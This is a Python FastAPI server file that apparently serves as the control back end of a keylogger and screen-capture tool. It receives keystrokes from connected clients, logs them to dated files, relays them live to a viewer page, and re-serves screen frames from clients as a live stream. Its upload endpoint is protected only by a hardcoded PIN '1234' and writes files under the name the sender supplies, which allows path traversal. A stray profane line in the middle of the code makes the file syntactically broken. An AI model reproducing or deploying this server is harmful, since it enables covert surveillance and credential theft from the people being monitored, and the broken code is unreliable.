import base64
import logging
import time
import traceback
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException, UploadFile, File, Form
from fastapi.responses import HTMLResponse, JSONResponse, StreamingResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
from typing import Dict, List
from fastapi import Request
from fastapi.websockets import WebSocketState
from pydantic import BaseModel
import json
import uvicorn
import os
from datetime import datetime
import asyncio
import signal


app = FastAPI()

active_connections = []

app.mount(
    "/static", StaticFiles(directory="py_ws_executor/server/static"), name="static")

templates = Jinja2Templates(directory="py_ws_executor/server/templates")

UPLOAD_PIN = "1234"


class EventRequest(BaseModel):
    event: str
    data: dict


class ConnectionManager:
    def __init__(self):
        # Dict mapping WebSocket connections to client info
        self.active_clients: dict[WebSocket, dict] = {}
        self.stream_locks: dict[str, asyncio.Lock] = {}
        self.frame_queues: dict[str, asyncio.Queue] = {}
        self.client_data_ws: dict[str, WebSocket] = {}
        self.shutdown_event = asyncio.Event()

    async def connect(self, websocket: WebSocket):
        await websocket.accept()
        data = await websocket.receive_json()
        event = data.get("event")
        data = data.get("data")
        if event == "connect":
            if data["client_type"] == "client":
                client = {
                    "client_id": data["client_id"],
                    "keystrokes": [],
                    "settings": {
                        "keystrokes": True,
                    },
                    "streaming_ws": None,
                    "frontend_ws": None,
                }
                self.active_clients[websocket] = client
                self.stream_locks[data["client_id"]] = asyncio.Lock()
                self.frame_queues[data["client_id"]] = asyncio.Queue()  # Only keep latest frame
                # asyncio.create_task(self.handle_keystrokes(
                #     self.active_clients[websocket]))
            elif data["client_type"] == "client_stream":
                print("attatching streaming ws")
                self.attatch_streaming_ws(websocket, data["client_id"])
            elif data["client_type"] == "client_data":
                self.client_data_ws[data["client_id"]] = websocket

    def attatch_streaming_ws(self, websocket: WebSocket, client_id: str):
        for client in self.active_clients:
            if self.active_clients[client]["client_id"] == client_id:
                self.active_clients[client]["streaming_ws"] = websocket

    def get_ws_from_client_id(self, client_id: str):
        for client in self.active_clients:
            if self.active_clients[client]["client_id"] == client_id:
                return client
        return None

    def disconnect(self, websocket: WebSocket):
        if websocket in self.active_clients:
            client_id = self.active_clients[websocket]["client_id"]
            if client_id in self.stream_locks:
                del self.stream_locks[client_id]
            if client_id in self.frame_queues:
                del self.frame_queues[client_id]
            del self.active_clients[websocket]

    async def send_message(self, message: str, websocket: WebSocket):
        try:
            await websocket.send_text(message)
        except Exception as e:
            print(f"Error sending message: {e}")

    async def broadcast(self, message: str):
        for websocket in self.active_clients:
            await websocket.send_text(message)

    async def handle_keystrokes(self, client_dict):
        os.makedirs('py_ws_executor/server/keystrokes', exist_ok=True)

        while not self.shutdown_event.is_set():
            await asyncio.sleep(10)

            current_time = datetime.now()
            today = current_time.strftime('%Y-%m-%d')
            filename = f'py_ws_executor/server/keystrokes/{today}.txt'

            if client_dict["settings"]["keystrokes"]:
                if client_dict["keystrokes"]:
                    with open(filename, 'a') as f:
                        f.write(''.join(client_dict["keystrokes"]) + '\n')
                client_dict["keystrokes"] = []
fuck you bitchhhhh

manager = ConnectionManager()


class StreamManager:
    def __init__(self):
        self.streaming_sockets: Dict[str, Dict[str, any]] = {}
        self.shutdown_event = asyncio.Event()

    def add_streaming_socket(self, websocket: WebSocket, client_id: str):
        self.streaming_sockets[client_id] = {"websocket": websocket, "frame_queue": asyncio.Queue()}
        print(f"added streaming socket for client {client_id}")
        print(self.streaming_sockets)
    
    def remove_streaming_socket(self, client_id: str):
        if client_id in self.streaming_sockets:
            del self.streaming_sockets[client_id]
        else:
            print(f"Client {client_id} not found. Nothing to remove.")

    def get_streaming_sockets(self):
        return list(self.streaming_sockets.values())
    
    def get_websocket(self, client_id: str):
        print(f"getting websocket for client {client_id}")
        client_data = self.streaming_sockets.get(client_id)
        if client_data:
            return client_data.get("websocket")
        return None  # Or raise an exception depending on your preference
        
    def get_frame_queue(self, client_id: str):
        client_data = self.streaming_sockets.get(client_id)
        if client_data:
            return client_data.get("frame_queue")
        return None  # Or raise an exception depending on your preference
    
    def add_frame(self, client_id: str, frame: bytes):
        steaming_ws = self.streaming_sockets.get(client_id)
        if not steaming_ws:
            print(f"Client {client_id} not found.")
            return

        frame_queue = self.get_frame_queue(client_id)
        if frame_queue:
            try:
                frame_queue.put_nowait(frame)
            except asyncio.QueueFull:
                print(f"Queue for client {client_id} is full. Dropping frame.")
        else:
            print(f"No frame queue found for client {client_id}")


stream_manager = StreamManager()


@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)

    try:
        while not manager.shutdown_event.is_set():
            try:
                stream_event = {"event": "stream", "data": {"value": True}}
                if websocket.application_state == WebSocketState.CONNECTED:
                    await manager.send_message(json.dumps(stream_event), websocket)
                try:
                    data = await websocket.receive_json()
                except Exception as e:
                    print(f"Error receiving JSON: {e}")
                    break
                    
                # print(f"received data: {data}")

                event = data.get("event")
                if event:
                    event_data = data.get("data", {})
                    if event == "keystroke":
                        key = event_data.get('key')
                        manager.active_clients[websocket]["keystrokes"].append(
                            key)
                        front_end_ws = manager.active_clients[websocket]['frontend_ws']
                        if front_end_ws:
                            await front_end_ws.send_json({"event": "keypress", "data": {"key": key}})
                    if event == "stream_begin":
                        client_id = event_data["client_id"]
                        stream_manager.add_streaming_socket(websocket, client_id)
                    if event == "stream_end":
                        client_id = event_data["client_id"]
                        stream_manager.remove_streaming_socket(client_id)
                    if event == "stream_data":
                        client_id = event_data["client_id"]
                        frame = event_data.get("frame")
                        if frame:
                            try:
                                frame = base64.b64decode(frame)
                                stream_manager.add_frame(client_id, frame)
                            except asyncio.QueueFull:
                                _ = stream_manager.get_websocket(client_id)['frame_queue'].get_nowait()
                                stream_manager.get_frame_queue(client_id).put_nowait(frame)
                            except Exception as e:
                                print(f"Error decoding frame: {e}")
                                pass
                    

                    await manager.broadcast(json.dumps({"event": event, "data": event_data}))
                else:
                    await manager.send_message("Error: Invalid event format", websocket)
            except json.JSONDecodeError:
                await manager.send_message("Error: Received invalid JSON", websocket)
            except Exception as e:
                print(f"Error handling websocket message: {e}")
                print(traceback.format_exc())
                if websocket in manager.active_clients:
                    print(f"client type: {manager.active_clients[websocket]['client_type']}")
                break

    except WebSocketDisconnect as e:
        print(f"WebSocket disconnected with code {e.code}")
    except Exception as e:
        print(f"Unexpected error: {e}")
    finally:
        manager.disconnect(websocket)


@app.get("/tts", response_class=HTMLResponse)
async def get_html_page(request: Request):
    return templates.TemplateResponse("index.html", {"request": request})


@app.post("/send-event")
async def send_event(request: EventRequest):
    try:
        event = request.event
        data = request.data

        await manager.broadcast(json.dumps({"event": event, "data": data}))

        return JSONResponse(content={"status": "Event sent successfully"})
    except Exception as e:
        raise HTTPException(status_code=500, detail="Failed to send event")


@app.post("/upload")
async def upload_file(
    file: UploadFile = File(...),
    pin: str = Form(...),
):
    if pin != UPLOAD_PIN:
        raise HTTPException(status_code=403, detail="Invalid PIN")

    try:
        upload_dir = "py_ws_executor/server/uploads"
        os.makedirs(upload_dir, exist_ok=True)

        file_path = os.path.join(upload_dir, file.filename)
        with open(file_path, "wb") as buffer:
            content = await file.read()
            buffer.write(content)

        return JSONResponse(content={
            "status": "success",
            "message": "File uploaded successfully",
            "filename": file.filename
        })
    except Exception as e:
        raise HTTPException(
            status_code=500, detail=f"Failed to upload file: {str(e)}")

class FrontEndManager:
    def __init__(self):
        self.front_end_ws: Dict[str, WebSocket] = {}

    async def connect(self, websocket: WebSocket, client_id: str):
        self.front_end_ws[websocket] = websocket
        await websocket.send_json({"event": "connect", "data": {"frontend_id": client_id, "client_type": "frontend"}})

    def disconnect(self, websocket: WebSocket):
        if websocket in self.front_end_ws:
            del self.front_end_ws[websocket]
    
    async def send_message(self, message: str, websocket: WebSocket):
        try:
            await websocket.send_json(message)
        except Exception as e:
            print(f"Error sending message: {e}")

    async def attatch_to_client(self, websocket: WebSocket, client_id: str):
        client = manager.get_ws_from_client_id(client_id)
        if client:
            manager.active_clients[client]["frontend_ws"] = websocket

frontend_manager = FrontEndManager()

@app.get("/stream", response_class=HTMLResponse)
async def get_stream_page(request: Request):
    return templates.TemplateResponse("stream.html", {"request": request})


@app.get("/streamingWs")
async def get_streaming_ws(request: Request):
    streaming_ws = [
        ws for ws in manager.active_clients if manager.active_clients[ws]["streaming_ws"] is not None]
    print(streaming_ws)
    print([manager.active_clients[ws]
                         ["client_id"] for ws in streaming_ws])
    streaming_clients = [manager.active_clients[ws]
                         ["client_id"] for ws in streaming_ws]
    return JSONResponse(content={"client_websockets": streaming_clients})


@app.get("/{client_id}")
async def test_stream(request: Request):
    return templates.TemplateResponse("test_stream.html", {"request": request})

@app.websocket("/ws/{client_id}")
async def ks_ws(websocket: WebSocket, client_id: str):
    await websocket.accept()
    await frontend_manager.connect(websocket, client_id)
    await frontend_manager.attatch_to_client(websocket, client_id)
    print(f"connected frontend {client_id}")
    while True:
        await asyncio.sleep(1)



@app.get("/stream/{client_id}")
async def get_stream(client_id: str):
    async def get_stream_for_client(client_id: str):
        if not stream_manager.get_websocket(client_id):
            raise HTTPException(
                status_code=404, detail="Client not found or not streaming"
            )

        last_frame = None  # Variable to hold the last valid frame
        boundary = "frame"
        total_data_transferred = 0  # Track the total data transferred
        start_time = time.time()  # Record the start time
        tracking_duration = 10  # Duration to track data in seconds

        while not stream_manager.shutdown_event.is_set():
            try:
                # Wait for new frame with timeout
                frame = await asyncio.wait_for(
                    stream_manager.get_frame_queue(client_id).get(), timeout=1.0
                )
                yield_statement = (
                    f"--{boundary}\r\n"
                    f"Content-Type: image/webp\r\n"
                    f"Content-Length: {len(frame)}\r\n\r\n"
                ).encode("utf-8")

                if frame:
                    total_data_transferred += len(yield_statement) + len(frame) + 2  # Include "\r\n"
                    yield yield_statement + frame + b"\r\n"
                    last_frame = frame  # Update last_frame with current valid frame
                elif last_frame:
                    total_data_transferred += len(yield_statement) + len(last_frame) + 2
                    # If timeout but we have a valid previous frame, send that instead
                    yield yield_statement + last_frame + b"\r\n"

                # Stop tracking after 10 seconds
                if time.time() - start_time > tracking_duration:
                    print(
                        f"Data transferred in the first {tracking_duration} seconds: {total_data_transferred} bytes"
                    )
                    # Reset tracking variables if you want to stop tracking after 10 seconds
                    total_data_transferred = 0

            except asyncio.TimeoutError:
                if last_frame:
                    total_data_transferred += len(yield_statement) + len(last_frame) + 2
                    yield yield_statement + last_frame + b"\r\n"
            except Exception as e:
                print(f"Stream error: {e}")
                break

    return StreamingResponse(get_stream_for_client(client_id), media_type="multipart/x-mixed-replace; boundary=frame")


def signal_handler(signum, frame):
    global kill_flag
    kill_flag = True
    print("\nShutting down gracefully...")
    manager.shutdown_event.set()
    stream_manager.shutdown_event.set()

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    global kill_flag
    try:
        uvicorn.run(app, host="localhost", port=8122)
    except KeyboardInterrupt:
        print("Server stopped by user.")